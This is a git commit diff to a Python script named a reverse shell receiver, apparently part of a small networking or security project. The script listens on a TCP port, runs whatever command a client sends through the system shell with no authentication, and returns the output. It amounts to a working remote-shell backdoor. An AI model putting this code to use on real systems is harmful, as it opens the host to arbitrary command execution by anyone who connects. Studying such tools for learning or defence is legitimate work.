2792c751c4751f79240226722aff25b576b7a3d9
Ted <58144503+BUSH222@users.noreply.github.com>
2024-11-24 11:18:54 +0300

    pre docker commit
    Co-authored-by: nexxy06 <nexxy06@users.noreply.github.com>
    Co-authored-by: Михаил Емельянцев <MiamiofMB@users.noreply.github.com>

--- tcp_actions/reverse_shell_reciever.py
+++ tcp_actions/reverse_shell_reciever.py
@@ -1,5 +1,6 @@
 import socket
 import subprocess
+
 import sys
 
 host = sys.argv[1]
@@ -8,13 +9,27 @@ server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server_socket.bind((host, port))
 server_socket.listen(1)
 print(f"Сервер запущен на {host}:{port}. Ожидание подключения...")
-conn, addr = server_socket.accept()
-print(f"Подключено к {addr}")
+
 while True:
+
+
+    conn, addr = server_socket.accept()
+    print(f"Подключено к {addr}")
+
+
+    # Ожидаем команду от клиента
     command = conn.recv(1024).decode('utf-8')
-    print(f"Получена команда: {command}")
+
+
+
+
+    # Выполняем команду и получаем результат
     try:
         output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
         conn.sendall(output)
+        conn.close()
     except subprocess.CalledProcessError as e:
         conn.sendall(e.output)
+        conn.close()
+
+
